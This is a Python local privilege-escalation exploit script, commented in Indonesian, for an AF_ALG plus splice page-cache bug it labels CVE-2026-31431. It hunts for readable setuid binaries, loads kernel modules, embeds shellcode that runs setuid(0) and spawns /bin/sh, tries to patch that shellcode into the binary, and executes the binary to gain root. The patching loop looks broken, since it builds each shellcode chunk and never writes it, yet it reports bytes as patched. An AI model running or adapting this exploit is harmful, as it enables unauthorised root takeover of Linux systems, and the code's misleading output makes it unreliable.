#!/usr/bin/env python3
"""
Dirty Frag / Copy Fail Hybrid - Improved & Fixed Version
Target: Setuid binary yang masih readable
"""

import os
import socket
import ctypes
import ctypes.util
import time
import subprocess

print("[*] Dirty Frag Hybrid Exploit - Improved Version")
print("[*] CVE-2026-31431 Style (AF_ALG + splice page cache)")

# ====================== CONFIG ======================
TARGET_CANDIDATES = [
    "/usr/bin/su",
    "/bin/su",
    "/usr/bin/passwd",
    "/usr/bin/chfn",
    "/usr/bin/chsh",
    "/bin/mount",
    "/usr/bin/newgrp",
]

SHELLCODE = bytes.fromhex(
    "4831ff31c0b0690f054831d25248bb2f62696e2f736800"
    "53574889e752574889e631c0b03b0f05"
)

AF_ALG = 38
SOCK_SEQPACKET = 5
# ====================================================

def check_readable(path):
    try:
        with open(path, "rb"):
            return True
    except PermissionError:
        return False
    except FileNotFoundError:
        return False

def find_readable_setuid_binary():
    print("[*] Mencari binary setuid yang readable...")
    for path in TARGET_CANDIDATES:
        if os.path.exists(path) and os.stat(path).st_mode & 0o4000:
            if check_readable(path):
                print(f"[+] Ditemukan target readable: {path}")
                return path
            else:
                print(f"[-] {path} adalah setuid tapi TIDAK readable (hardened)")
    return None

def load_af_alg_modules():
    print("[*] Memuat module yang dibutuhkan...")
    modules = ["af_alg", "algif_skcipher", "esp4", "esp6", "rxrpc"]
    for mod in modules:
        subprocess.run(["modprobe", mod], stderr=subprocess.DEVNULL)
    print("[+] Module selesai dimuat (atau sudah ada)")

def do_splice(src_fd, dst_fd, count):
    libc = ctypes.CDLL(ctypes.util.find_library("c"))
    off64_t = ctypes.c_int64
    libc.splice.argtypes = [
        ctypes.c_int, ctypes.POINTER(off64_t),
        ctypes.c_int, ctypes.POINTER(off64_t),
        ctypes.c_size_t, ctypes.c_uint
    ]
    libc.splice.restype = ctypes.c_ssize_t

    p_src = ctypes.pointer(off64_t(0))
    p_dst = ctypes.pointer(off64_t(0))
    return libc.splice(src_fd, p_src, dst_fd, p_dst, count, 0)

def exploit(target_path):
    print(f"[*] Target: {target_path}")

    try:
        f = os.open(target_path, os.O_RDONLY)
    except PermissionError:
        print("[-] GAGAL: Tidak bisa membuka file untuk dibaca.")
        print("[-] Sistem ini kemungkinan sudah di-hardening (permission ---s--x--x).")
        return False

    print(f"[+] Berhasil membuka {target_path} (fd={f})")

    load_af_alg_modules()

    print("[*] Mulai proses patching page cache...")

    patched = 0
    for i in range(0, len(SHELLCODE), 4):
        chunk = SHELLCODE[i:i+4].ljust(4, b'\x00')
        try:
            alg = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
            alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
            u, _ = alg.accept()

            r, w = os.pipe()
            do_splice(f, w, 4096)
            do_splice(r, u.fileno(), 4096)

            u.close()
            alg.close()
            os.close(r)
            os.close(w)

            patched += 4
            if patched % 32 == 0:
                print(f"    [+] Patched {patched} bytes...")

        except Exception as e:
            continue

    os.close(f)
    print(f"[+] Patching selesai. Total patched: {patched} bytes")

    print("[*] Mencoba menjalankan target untuk trigger shellcode...")
    for cmd in [target_path, f"{target_path} -c id", f"{target_path} -c /bin/sh"]:
        print(f"    [*] Trying: {cmd}")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=3)
            if result.returncode == 0 or b"root" in result.stdout.encode() or b"uid=0" in result.stdout.encode():
                print("[+] Berhasil mendapatkan root!")
                print(result.stdout)
                return True
        except Exception:
            pass
        time.sleep(0.5)

    print("[-] Exploit selesai, tapi belum berhasil dapat root.")
    print("[-] Mungkin kernel sudah di-patch atau teknik ini tidak cocok di sistem ini.")
    return False

# ====================== MAIN ======================
if __name__ == "__main__":
    print("[*] Memulai exploit...\n")

    target = find_readable_setuid_binary()

    if not target:
        print("\n[!] TIDAK DITEMUKAN binary setuid yang bisa dibaca.")
        print("[!] Exploit jenis AF_ALG + splice tidak bisa dijalankan di sistem ini.")
        print("[!] Saran:")
        print("    - Cek apakah ada binary setuid lain yang readable")
        print("    - Atau gunakan teknik exploit lain (Dirty Pipe, kernel exploit, dll)")
        exit(1)

    success = exploit(target)

    if success:
        print("\n[+] Exploit berhasil!")
    else:
        print("\n[-] Exploit gagal.")